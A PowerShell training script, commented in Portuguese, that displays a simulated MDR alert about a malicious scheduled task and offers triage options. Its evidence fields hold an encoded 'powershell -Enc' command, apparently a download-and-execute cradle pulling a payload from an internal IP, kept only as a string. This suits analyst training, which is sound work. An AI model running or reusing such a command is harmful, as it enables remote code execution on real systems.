<#
.SYNOPSIS
    Simula um alerta de MDR para treinamento
#>

class AlertaMDR {
    [string]$Id
    [string]$Titulo
    [string]$Severidade
    [string]$Hostname
    [string]$Usuario
    [string]$Descricao
    [datetime]$Timestamp
    [hashtable]$Evidencias
    
    AlertaMDR() {
        $this.Id = "INC-" + (Get-Random -Minimum 1000 -Maximum 9999)
        $this.Timestamp = Get-Date
        $this.Evidencias = @{}
    }
    
    [string]ToString() {
        return @"
========================================
🚨 ALERTA MDR #$($this.Id)
========================================
Título: $($this.Titulo)
Severidade: $($this.Severidade)
Host: $($this.Hostname)
Usuário: $($this.Usuario)
Descrição: $($this.Descricao)
Timestamp: $($this.Timestamp)
========================================
"@
    }
}

# Criar alerta simulado
$alerta = [AlertaMDR]::new()
$alerta.Titulo = "New Scheduled Task Created via Malicious PowerShell"
$alerta.Severidade = "Média"
$alerta.Hostname = "SRV-APP-01"
$alerta.Usuario = "JDOE"
$alerta.Descricao = "Tarefa 'UpdaterService' criada com PowerShell codificado"

# Adicionar evidências
$alerta.Evidencias["EventID"] = @(4698, 4104)
$alerta.Evidencias["Command"] = "powershell.exe -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAALwBwAGEAeQBsAG8AYQBkAC4AZQB4AGUAJwApAA=="
$alerta.Evidencias["SourceIP"] = "192.168.1.50"
$alerta.Evidencias["TaskName"] = "UpdaterService"

# Exibir alerta
Clear-Host
Write-Host $alerta.ToString() -ForegroundColor Yellow

Write-Host "`n=== EVIDÊNCIAS ===" -ForegroundColor Cyan
$alerta.Evidencias.GetEnumerator() | ForEach-Object {
    Write-Host "$($_.Key): $($_.Value)" -ForegroundColor White
}

Write-Host "`n=== AÇÕES DE TRIAGEM ===" -ForegroundColor Cyan
Write-Host "[1] Decodificar Base64" -ForegroundColor Gray
Write-Host "[2] Verificar logs de logon" -ForegroundColor Gray
Write-Host "[3] Buscar processos filhos" -ForegroundColor Gray
Write-Host "[4] Consultar threat intelligence" -ForegroundColor Gray

$escolha = Read-Host "`nSelecione a ação (1-4)"

switch ($escolha) {
    "1" {
        Write-Host "`nDecodificando..." -ForegroundColor Green
        # Chamar script de decodificação
    }
    "2" {
        Write-Host "`nBuscando logons..." -ForegroundColor Green
    }
}